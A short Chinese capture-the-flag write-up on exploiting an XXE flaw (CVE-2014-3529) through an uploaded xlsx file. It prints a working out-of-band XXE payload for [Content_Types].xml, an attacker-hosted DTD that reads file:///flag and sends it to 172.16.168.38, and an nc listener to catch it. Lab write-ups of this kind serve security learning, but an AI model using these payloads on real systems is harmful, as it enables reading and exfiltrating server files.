这里有个excel单词，涉及了下面的CVE-2014-3529没有对xxe进行防护。

漏洞利用

受害端文件构造

首先新建文件excel-开头的文件，这里我的文件名为excel-1.xlsx

~这里因为听说buu的靶机都可以访问外网了，所以这里直接可以拿我的服务器做一下测试。~屁勒，不能，还是开个主机吧，172.16.167.234是靶机的内网ipifconfig

然后把后缀名改为.zip后，改文件[Content_Types].xml的内容，向其中从第二行添加内容如下

<!DOCTYPE convert [ 
<!ENTITY % remote SYSTEM "http://172.16.168.38/file.dtd">
%remote;%int;%send;
]>

改后将文件名重新再次命名为excel-1.xlsx

攻击端文件构造

然后在攻击机的/var/www/html/下面新建file.dtd文件，内容如下

<!ENTITY % file SYSTEM "file:///flag">
<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://172.16.168.38:1111?p=%file;'>">

反弹shell

然后在攻击机端执行命令

nc -lvvp 1111

对反弹的流量进行监听

flag
然后上传excel-1.xlsx文件，在攻击机端接收到flag
